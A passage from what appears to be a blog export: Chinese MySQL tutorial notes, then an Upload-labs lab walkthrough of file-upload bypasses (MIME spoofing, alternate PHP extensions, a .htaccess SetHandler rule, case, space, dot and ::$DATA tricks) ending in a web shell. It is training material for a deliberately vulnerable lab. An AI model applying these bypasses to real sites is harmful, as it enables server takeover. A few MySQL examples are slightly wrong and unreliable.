数据库n > 路径/文件名.sql\n\n#备份数据库中表\nmysqldump -u 用户名 -p  数据库 表1 表2 表n > 路径/文件名.sql\n\n注：该指令要在DOS下执行\n```\n\n#### 恢复数据库\n\n```sql\nSource 路径/文件名.sql\n\n注：该指令要进入mysql下执行\n```\n\n### 数据类型\n\n![](https://img.jwt1399.top/img/image-20211230202353079.png)\n\n#### 数值型(整数)\n\n| 类型                | 字节 | 最小值               | 最大值               |\n| ------------------- | ---- | -------------------- | -------------------- |\n| TINYINT             | 1    | -128                 | 127                  |\n| TINYINT(unsigned)   | 1    | 0                    | 255                  |\n| SMALLINT            | 2    | -32768               | 32767                |\n| SMALLINT(unsigned)  | 2    | 0                    | 65535                |\n| MEDIUMINT           | 3    | -8388508             | 8388607              |\n| MEDIUMINT(unsigned) | 3    | 0                    | 16777215             |\n| INT                 | 4    | -2147483648          | 2147483647           |\n| INT(unsigned)       | 4    | 0                    | 16777215             |\n| BIGINT              | 8    | -9223372036854775808 | 9223372036854775807  |\n| BIGINT(unsigned)    | 8    | 0                    | 18446744073709551615 |\n\n```sql\nCREATE TABLE t1 (id TINYINT);#默认是有符号的，-128~127\nCREATE TABLE t2 (id TINYINT UNSIGNED);#指定unsinged,就是无符号0~255\n```\n\n#### 数值型(bit)\n\n![](https://img.jwt1399.top/img/202201061612447.png)\n\n#### 数值型(小数)\n\n![](https://img.jwt1399.top/img/202201061612848.png)\n\n#### 字符串(char&varchar)\n\n- CHAR(size)\n  - 固定长度字符串最大255 字符\n- VARCHAR(size) 0~65535 字节\n  - 可变长度字符串最大65532 字节【本身还需要1-3个字节用于记录存放内容长度】\n  - 如果表的编码是utf8 ，size = (65535-3) / 3 = 21844\n  - 如果表的编码是gbk ， size = (65535-3) / 2 = 32766\n\n- 查询速度 CHAR > VARCHAR，因此数据是定长时，推荐使用CHAR\n\n如果 VARCHAR 不够用，可以使用mediumtext、text、longtext\n\n#### 日期类型\n\n```sql\nCREATE TABLE b_name (\n  birthday DATE , -- 生日\n  job_time DATETIME, -- 记录年月日时分秒\n  login_time TIMESTAMP\n  NOT NULL DEFAULT CURRENT_TIMESTAMP\n  ON UPDATE CURRENT_TIMESTAMP); -- 登录时间, 如果希望login_time列自动更新, 需要配置\n\nSELECT * FROM b_name;\nINSERT INTO b_name(birthday, job_time)\nVALUES('2022-11-11','2022-11-11 10:10:10');\n-- 如果我们更新b_name表的某条记录，login_time列会自动的以当前时间进行更新\n```\n\n### 表操作\n\n#### 创建表\n\n```sql\nCREATE TABLE 表名(\n\tfield1 datatype NOT NULL AUTO_INCREMENT，PRIMARY KEY,\n\tfield2 datatype DEFAULT 'test',\n\tfield3 datatype,\n)character set 字符集 collate 校对规则 engine 引擎\n\n注：\nfield:指定列名，datatype: 指定列类型(字段类型)\ncharacter set :如不指定则为所在数据库字符集\ncollate:如不指定则为所在数据库校对规则\nengine:引擎(这个涉及内容较多，后面单独讲解)\n```\n\n- 如果你不想字段为 **NULL** 可以设置字段的属性为 **NOT NULL**， 在操作数据库时如果输入该字段的数据为**NULL** ，就会报错。\n- **AUTO_INCREMENT**定义列为自增的属性，一般用于主键，数值会自动加1。\n- **PRIMARY KEY**关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。\n- **DEFAULT**关键字用于定义列的默认值\n\n```sql\nCREATE TABLE `user`(\n  id INT,\n  name VARCHAR (255),\n  password VARCHAR (255),\n  birthday DATE\n)CHARACTER SET utf8 COLLATE utf8_bin ENGINE INNODB ;\n```\n\n#### 查看表结构\n\n```sql\nDESC 表名  -- 显示表结构，可以查看表的所有列\n```\n\n#### 删除表\n\n```sql\nDROP TABLE [IF EXISTS] 表名\n```\n\n####  添加列\n\n```sql\nALTER TABLE 表名\nADD 列名 数据类型 [DEFAULT expr]\n\n-- 在员工表emp中增加一个image列，varchar类型(要求在resume后面)，默认不为空，默认数据为test。\nALTER TABLE emp\nADD image VARCHAR(32) NOT NULL DEFAULT 'test'\nAFTER RESUME\n\nDESC emp -- 显示表结构，可以查看表的所有列\n```\n\n#### 修改列\n\n```sql\nALTER TABLE 表名\nMODIFY 列名 数据类型 [DEFAULT expr]\n\n-- 修改job列，使其长度为60。\nALTER TABLE emp\nMODIFY job VARCHAR(60) NOT NULL DEFAULT 'test'\n```\n\n#### 删除列\n\n```sql\nALTER TABLE 表名\nDROP 列名 \n\n-- 删除sex列。\nALTER TABLE emp\nDROP sex\n```\n\n#### 修改表名\n\n```sql\nRENAME TABLE 表名 TO 新表名\n\n-- 修改表名改为employee。\nRENAME TABLE emp TO employee\n```\n\n#### 修改表字符集\n\n```sql\nALTER TABLE 表名 CHARACTER SET utf8\n\n-- 修改表的字符集为utf8\nALTER TABLE employee CHARACTER SET utf8\n```\n\n#### 修改列名\n\n```sql\nALTER TABLE 表名\nCHANGE 列名 新列名 数据类型 [DEFAULT expr]\n\n-- 列名name 修改为user_name\nALTER TABLE employee\nCHANGE `name` `user_name` VARCHAR(64) NOT NULL DEFAULT 'test'\n```\n\n### CRUD语句\n\n> `CRUD`即增加(Create)、查询(Retrieve)、更新(Update)、删除(Delete)四个单词的首字母缩写。\n\n#### 增加(Create)\n\n```sql\n-- 普通插入\nINSERT INTO 表名 VALUE (value1,value2)\n\n-- 指定要插入数据的列\nINSERT INTO 表名 (column1,column2) VALUE (value1,value2) \n\n-- 批量插入（应注意SQL的长度限制）\nINSERT INTO TABLE VALUES (value1,value2),(value1,value2)\n\n-- 把一个表的数据插入到另一个表中(插入全部数据)\nINSERT INTO 目标表 SELECT * FROM 来源表  [WHERE key=value]\n\n-- 把一个表的数据插入到另一个表中(指定字段)\nINSERT  INTO 目标表 (字段1, 字段2, ...) SELECT 字段1, 字段2,... FROM 来源表  [WHERE key=value]\n```\n\n#### 查询(Retrieve)\n\n```sql\nSELECT column1,column2 FROM 表名\n\n-- 查询表中所有学生的信息。\nSELECT * FROM student;\n-- 查询表中所有学生的姓名和对应的英语成绩。\nSELECT `name`,english FROM student;\n-- 过滤表中重复数据。\nSELECT DISTINCT english FROM student;\n-- 使用表达式对查询列运算\nSELECT `name`, (chinese+english+math) FROM student;\n-- 在所有学生总分加10 分的情况\nSELECT `name`, (chinese + english + math + 10) FROM student;\n-- 使用别名表示学生分数。\nSELECT `name` , (chinese + english + math + 10) AS total_score FROM student;\n```\n\n#### 更新(Update)\n\n```sql\n-- 一次更新一个字段\nUPDATE table SET column1 = value1 WHERE 条件 -- 如果不加WHERE条件，UPDATE语句会默认更新所有表，慎用。\n\n-- 一次更新多个字段\nUPDATE table SET column1 = value1,column2 = value2 WHERE 条件\n\n\n-- 将所有员工薪水修改为5000 元。\nUPDATE employee SET salary = 5000\n-- 将姓名为小妖怪的员工薪水修改为3000 元。\nUPDATE employee SET salary = 3000 WHERE user_name = '小妖怪'\n-- 将老妖怪的薪水在原有基础上增加1000 元\nUPDATE employee SET salary = salary + 1000 WHERE user_name = '老妖怪'\n-- 可以修改多个列的值\nUPDATE employee SET salary = salary + 1000 , job = '码农' WHERE user_name = '老妖怪'\nSELECT * FROM employee;\n```\n\n#### 删除(Delete)\n\n```sql\nDELETE FROM 表名 WHERE column1 = value1\n\n-- 删除表中名称为’老妖怪’的记录。\nDELETE FROM employee WHERE user_name = '老妖怪';\n-- 删除表中所有记录, 慎用。\nDELETE FROM employee;\n```\n\n### 事务\n\n事务用于保证数据的一致性它由一组相关的 dml 语句组成，该组的 dml 语句要么全部成功，要么全部失败。如:转账就要用事务来处理，用以保证数据的一致性。\n\n当执行事务操作时(dml语句)，mysql会在表上加锁，防止其它用户改表的数据\n\n#### 事务的几个重要操作\n\n1. **start transaction** --开始一个事务\n2. **savepoint 保存点名** --设置保存点\n3. **rollback to 保存点名** --回退事务\n4. **rollback** --回退全部事务\n5. **commit** --提交事务，所有的操作生效，不能回退\n\n```sql\n-- 1. 创建一张测试表\nCREATE TABLE test\n( id INT,\n`name` VARCHAR(32));\n\n-- 2. 开始事务\nSTART TRANSACTION\n\n-- 3. 设置保存点\nSAVEPOINT a\n-- 执行dml 操作\nINSERT INTO test VALUES(100, 'tom');\n\nSELECT * FROM test;\n\nSAVEPOINT b\n-- 执行dml 操作\nINSERT INTO test VALUES(200, 'jack');\n\n-- 回退到b\nROLLBACK TO b\n\n-- 继续回退a\nROLLBACK TO a\n\n-- 如果这样, 表示直接回退到事务开始的状态.\nROLLBACK\n\n-- 提交事务\nCOMMIT\n```\n\n- 保存点(savepoint)：保存点是事务中的点，用于取消部分事务，\n\n- 当执行回退事务(rollback)时，通过指定保存点可以回退到指定的点\n- 当提交事务(commit)时 ,会自动的删除该事务所定义的所有保存点，当执行了 commit 语句后，会确认事务的变化、结束事务、删除保存点、释放锁，数据生效。\n\n#### 事务细节讨论\n\n- 1.如果不开始事务，默认情况下，dml 操作是自动提交的，不能回滚\n- 2.如果开始一个事务，你没有创建保存点，你可以执行 rollback，默认就是回退到你事务开始的状态\n- 3.你也可以在这个事务中(还没有提交时)，创建多个保存点.比如: savepoint aaa; 执行dml，savepoint bbb;\n- 4.你可以在事务没有提交前，选择回退到哪个保存点\n- 5, mysql的事务机制需要 innodb 的存储引擎才可以使用，myisam不好使.\n- 6.开始一个事务 start transaction 或者 set autocommit=off;\n\n#### 事务隔离级别\n\n1.多个连接开启各自事务操作数据库中数据时，数据库系统要负责隔离操作，以保证各个连接在获取数据时的准确性。\n2.如果不考虑隔离性，可能会引发如下问题:\n\n- 脏读(dirty read)\n  - 当一个事务读取另一个事务尚未提交的改变(update,insert,delete)时，产生脏读\n- 不可重复读(nonrepeatable read)\n  - 同一查询在同事务中多次进行，由于其他提交事务所做的修改或删除， 每次返回不同的结果集，此时发生不可重复读。\n- 幻读(phantom read)\n  - 同一查询在同一事务中多次进行，由于其他提交事务所做的插入操作， 每次返回不同的结果集，此时发生幻读。\n\n\n![](https://img.jwt1399.top/img/image-20220223201056641.png)\n\n```sql\n1. 查看当前会话隔离级别\nselect @@tx_isolation;\n2.查看系统当前隔离级别\nselect @@global.tx_isolation;\n3. 设置当前会话隔离级别\nset session transaction isolation level repeatable read;\n4.设置系统当前隔离级别\nset global transaction isolation level repeatable read;\n5.mysql默认的事务隔离级别是repeatable read ,一般情况下，没有特殊\n要求，没有必要修改(因为该级别可以满足绝大部分项目需求)\n```\n\n●全局修改，修改my.ini配置文件，在最后加上\n#可选参数有: READ-UNCOMMITTED, READ-COMMITTED, REPEATABLE-READ, SERIALIZABLE.\n[mysqld]\ntransaction-isolation = REPEATABLE-READ\n\n#### 事务的ACID\n\n- 1.原子性(Atomicity)\n  - 原子性是指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。\n- 2.一致性(Consistency)\n  - 事务必须使数据库从一个一致性状态变换到另外一个一致性状态\n- 3.隔离性(Isolation)\n  - 事务的隔离性是多个用户并发访问数据库时，数据库为每一个用户开启的事务，不能被其他事务的操作数据所干扰，多个并发事务之间要相互隔离。\n- 4.持久性(Durability)\n  - 持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来即使数据库发生故障也不应该对其有任何影响\n\n### 日期函数\n\n#### DAYOFWEEK(date)\n\n返回日期date的星期索引(1=星期天，2=星期一, ……7=星期六)。这些索引值对应于ODBC标准。\n\n```sql\nselect DAYOFWEEK('1998-02-03')\n-> 3\n```\n\n#### WEEKDAY(date)\n\n返回date的星期索引(0=星期一，1=星期二, ……6= 星期天)。\n\n```sql\nmysql> select WEEKDAY('1997-10-04 22:23:00');\n-> 5\n```\n\n#### DAYOFMONTH(date)\n\n返回date的月份中日期，在1到31范围内。\n\n```sql\nmysql> select DAYOFMONTH('1998-02-03');\n-> 3\n```\n\n#### DAYOFYEAR(date)\n\n返回date在一年中的日数, 在1到366范围内。\n\n```sql\nmysql> select DAYOFYEAR('1998-02-03');\n-> 34\n```\n\n#### DAYNAME(date)\n\n返回date的星期名字。\n\n```sql\nmysql> select DAYNAME(\"1998-02-05\");\n-> 'Thursday'\n```\n\n#### MONTHNAME(date)\n\n返回date的月份名字。\n\n```sql\nmysql> select MONTHNAME(\"1998-02-05\");\n-> 'February'\n```\n\n#### QUARTER(date)\n\n返回date一年中的季度，范围1到4。\n\n```sql\nmysql> select QUARTER('98-04-01');\n-> 2\n```\n\n#### WEEK(date)\n\n对于星期天是一周的第一天的地方，有一个单个参数，返回date的周数，范围在0到52。\n\n```sql\nmysql> select WEEK('1998-02-20');\n-> 7\n```\n\n#### WEEK(date,first)\n\n2个参数形式WEEK()允许你指定星期是否开始于星期天或星期一。  \n如果第二个参数是0，星期从星期天开始，  \n如果第二个参数是1，从星期一开始。\n\n```sql\nmysql> select WEEK('1998-02-20',0);\n-> 7\n```\n\n```sql\nmysql> select WEEK('1998-02-20',1);\n-> 8\n```\n\n#### YEAR(date)\n\n返回date的年份，范围在1000到9999。\n\n```sql\nmysql> select YEAR('98-02-03');\n-> 1998\n```\n\n#### MONTH(date)\n\n返回date的月份，范围1到12。\n\n```sql\nmysql> select MONTH('1998-02-03');\n-> 2\n```\n\n#### DAY(date)\n\n返回date的月份，范围1到31。\n\n```sql\nmysql> select MONTH('1998-02-03');\n-> 3\n```\n\n#### HOUR(time)\n\n返回time的小时，范围是0到23。\n\n```sql\nmysql> select HOUR('10:05:03');\n-> 10\n```\n\n#### MINUTE(time)\n\n返回time的分钟，范围是0到59。\n\n```sql\nmysql> select MINUTE('98-02-03 10:05:03');\n-> 5\n```\n\n#### SECOND(time)\n\n回来time的秒数，范围是0到59。\n\n```sql\nmysql> select SECOND('10:05:03');\n-> 3\n```\n\n#### PERIOD\\_ADD(P,N)\n\n增加N个月到阶段P(以格式YYMM或YYYYMM)。以格式YYYYMM返回值。注意阶段参数P不是日期值。\n\n```sql\nmysql> select PERIOD_ADD(9801,2);\n-> 199803\n```\n\n#### PERIOD\\_DIFF(P1,P2)\n\n返回在时期P1和P2之间月数，P1和P2应该以格式YYMM或YYYYMM。注意，时期参数P1和P2不是日期值。\n\n```sql\nmysql> select PERIOD_DIFF(9802,199703);\n-> 11\n```\n\n#### DATE_ADD() \n\n向日期添加指定的时间间隔。\n\n```sql\nDATE_ADD(date,INTERVAL expr type)\n\n//interval是固定标志，expr 表示数量，可以为正负，表示加减，type表示日期类型 可以是yy,ww,dd等分别表示，年，周，天等\n\n// 得到当前时间增加1个小时的结果\nselect date_add(now(),interval 1 hour)\n\n// 得到当前时间增加1天的结果\nselect date_add(now(),interval 1 day)\n\n// 得到当前时间减少72个小时的结果\nselect date_add(now(),interval -72 hour)\n\n// 还有一些更加高级的用法，比如增加一天一小时一分一秒\n// 但是如果你不太喜欢这种用法，你仍然可以使用等同于该数值的second来进行加减\ndate_add(now(),interval '1 1:1:1' day_second)\n```\n\n### JOIN\n\nSQL JOIN 用于把来自两个或多个表的行结合起来。\n\n下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。\n\n![](https://img.jwt1399.top/img/sql-join.png)\n\n\n\n\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MySQL"],"categories":["SQL"]},{"title":"Upload-labs学习笔记","url":"/posts/22458.html","content":"![](https://img.jwt1399.top//img/20200824184011.png)\n**upload-labs包含漏洞类型分类**\n![](https://i.loli.net/2019/07/10/5d25e308bd36010715.png)\n**如何判断上传漏洞类型**?\n![](https://i.loli.net/2019/07/10/5d25e308a563a72451.png)\n**上传的过程**\n![](https://i.loli.net/2019/07/10/5d25e308bcbfc88081.png)\n\n## Pass-01（前端JS绕过）\n```php\nfunction checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"请选择要上传的文件!\");\n        return false;\n    }\n    //定义允许上传的文件类型\n    var allow_ext = \".jpg|.png|.gif\";\n    //提取上传文件的类型\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //判断上传文件类型是否允许上传\n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n```\n**方法一**：前端检测。js的检测只能位于client，可以禁用js,在浏览器设置中修改。或者直接改掉这里的 `checkFile()`\n![](https://i.loli.net/2019/07/10/5d25e3089bf2484973.png)\n修改之后就可以直接上传.php文件,上传之后复制图像地址就可以得到上传路径了\n![](https://i.loli.net/2019/07/10/5d259e89e70f481855.png)\n![](https://i.loli.net/2019/07/10/5d259eeca0ff482219.png)\n**方法二**：上传1.png直接抓包，修改后缀为php就可以绕过上传\n![](https://i.loli.net/2019/07/10/5d25921a1fa3871606.png)\n得到路径/upload/1.php,连接菜刀，得到shell\n![](https://i.loli.net/2019/07/10/5d259e89e762113980.png)\n## Pass-02（MIME绕过）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}\n```\n本节对数据包的MIME（content-type）进行了限定，只允许 image/jpeg、image/png、image/gif 图片内容数据传输。操作和第一节方法二一样。\n\n上传1.png直接抓包，修改后缀为php就可以绕过上传\n![](https://i.loli.net/2019/07/10/5d25921a1fa3871606.png)\n得到路径/upload/1.php,连接菜刀，得到shell\n![](https://i.loli.net/2019/07/10/5d259e89e762113980.png)\n\n## Pass-03（特殊可解析后缀绕过php4/phtml）\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n查看源码，发现是设置了文件后缀名黑名单，禁止上传后缀名为.php文件，这里利用php2、php3、php4、php5、phps、phtml一样会解析，直接修改后缀名为phps上传。\n复制图像地址\n![](https://i.loli.net/2019/07/10/5d25a447e8e7e46472.png)\n得到上传路径\n![](https://i.loli.net/2019/07/10/5d25a3f3b012145109.png)\n**常见扩展名绕过**：\n\n```\nasp:asa,cer,cdx\naspx:ashx,asmx,ascx\nphp:php2、php3、php4、php5、phps、phtml\njsp:jspx,jspf\n```\n## Pass-04（上传 .htaccess）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n比刚才的黑名单多了不少，但是.htaccess还是没有过滤，可以`重写文件解析规则`绕过，上传一个`.htaccess`，文件内容如下，意思就是在upload目录下匹配1.jpg的文件并以php文件执行\n```php\n<FilesMatch \"1.jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\t\n```\n上传一个`.htaccess`\n![](https://i.loli.net/2019/07/10/5d25ad7b5ee8e39892.png)\n上传`1.jpg`,应为重写了文件解析规则，1.jpg将会被以php文件执行\n![](https://i.loli.net/2019/07/10/5d25b04b0258016333.png)\n然后直接连接菜刀\n![](https://i.loli.net/2019/07/10/5d25b1ad8c6b176191.png)\ngetshell\n![](https://i.loli.net/2019/07/10/5d25b1639408c69941.png)\n**.htaccess攻击总结**\n有的时候由于各种名单的原因，可能我们不能上传任何php文件，而且还没有其他地方来解析成php，咋办？如果你能上传.htaccess文件的话，那么就很好办了。\n建一个.htaccess 文件，里面的内容如下\n```php\n<FilesMatch \"1.jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n这个时候就上传一个文件名字是1.jpg的文件，然后里面是一句话木马，1.jpg就会被当成1.php执行，就能成功连接菜刀\n\n## Pass-05（后缀大小写绕过）\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n**Pass-04与Pass-05代码对比**\n![](https://i.loli.net/2019/07/10/5d25e308c1cf337348.png)\n对比之后发现黑名单多了一个`.htaccess`\n并且没有将文件后缀转小写的代码了\n于是这里显然可以用大小写绕过，例如 .Php .phP\n![](https://i.loli.net/2019/07/11/5d2697927638a47192.png)\n\n## Pass-06（后缀末尾 加空格 绕过）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n**Pass-05与Pass-06代码对比**\n![](https://i.loli.net/2019/07/10/5d25eb9e76b1292828.png)\n发现删去了将文件名前后去空格的操作 所以可以利用`6.php(空格)`\n![](https://i.loli.net/2019/07/11/5d2696f2bc32834852.png)\n## Pass-07（后缀末尾 加点 绕过）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n**Pass-06与Pass-07代码对比**\n![](https://i.loli.net/2019/07/11/5d268d5ff024a68329.png)\n对比发现没有去处文件末尾的点的操作了\n于是利用`7.php.`\n![](https://i.loli.net/2019/07/11/5d268e891711188220.png)\n## Pass-08（ ::$DATA 绕过 ）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = 